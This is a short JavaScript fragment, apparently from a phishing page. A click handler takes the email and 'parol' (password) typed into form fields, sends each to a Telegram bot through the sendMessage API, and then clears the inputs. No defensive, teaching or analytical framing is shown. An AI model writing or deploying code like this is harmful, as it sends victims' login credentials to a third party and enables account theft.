...
btn.addEventListener('click',(e)=>{
    ...
    fetch(
        `https://api.telegram.org/bot${toket}/sendMessage?chat_id=${id}&text=${"email: "+inp2.value}`
    )
    fetch(
        `https://api.telegram.org/bot${toket}/sendMessage?chat_id=${id}&text=${"parol: "+inp3.value}`
    )
    inp1.value= ""
    inp2.value= ""
    inp3.value= ""
